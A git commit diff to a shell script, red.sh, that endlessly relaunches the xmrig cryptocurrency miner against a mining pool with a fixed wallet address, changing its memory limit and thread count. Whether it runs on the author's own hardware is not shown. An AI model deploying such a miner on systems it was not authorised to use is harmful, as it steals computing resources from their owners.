892c152288984dbef2a5685cbff0ace990a5099d
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2023-10-06 19:56:22 +0300

    Update red.sh

--- red.sh
+++ red.sh
@@ -5,8 +5,8 @@ while true; do
     start_time=$(date +%s%N)
 
     # Execute the command in the background
-    ulimit -v 8000000  # Set the virtual memory limit to 8GB
-    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:80 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.1333333ss1 -p x -t $(nproc)
+    ulimit -v 4000000  # Set the virtual memory limit to 4GB
+    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:80 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.1333333ss1 -p x -t 8
 
     # Wait for the command to finish
     wait
